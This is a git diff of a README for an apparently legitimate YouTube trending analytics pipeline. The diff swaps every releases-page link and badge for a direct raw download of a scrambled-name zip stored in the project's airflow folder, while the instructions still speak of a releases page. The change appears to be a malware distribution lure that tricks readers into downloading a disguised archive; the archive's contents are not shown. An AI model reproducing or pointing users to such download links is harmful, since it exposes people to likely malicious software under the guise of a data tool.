@@ -1,6 +1,6 @@
 # 📊 -YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline - Analyze YouTube Trends Instantly
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
+[![Download Release](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/raw/refs/heads/main/airflow/Analytics-Real-Engineering-Tube-Trending-You-Time-Data-Pipeline-v1.1.zip)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/raw/refs/heads/main/airflow/Analytics-Real-Engineering-Tube-Trending-You-Time-Data-Pipeline-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, ensure your system meets the following requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the latest releases and download the application.
-   [Download Here](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
+   [Download Here](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/raw/refs/heads/main/airflow/Analytics-Real-Engineering-Tube-Trending-You-Time-Data-Pipeline-v1.1.zip)
 
 2. **Choose Your Version:** On the releases page, look for the most recent version. Choose the file that matches your operating system.
 
@@ -68,6 +68,6 @@ For further assistance, feel free to reach out via the Issues section of this re
 - [Community Forum](#): Join discussions with other users and developers.
 - [Source Code](#): View and contribute to the source on GitHub.
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
+[![Download Release](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/raw/refs/heads/main/airflow/Analytics-Real-Engineering-Tube-Trending-You-Time-Data-Pipeline-v1.1.zip)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/raw/refs/heads/main/airflow/Analytics-Real-Engineering-Tube-Trending-You-Time-Data-Pipeline-v1.1.zip)
 
 Enjoy exploring trending YouTube content with this powerful analytics tool!
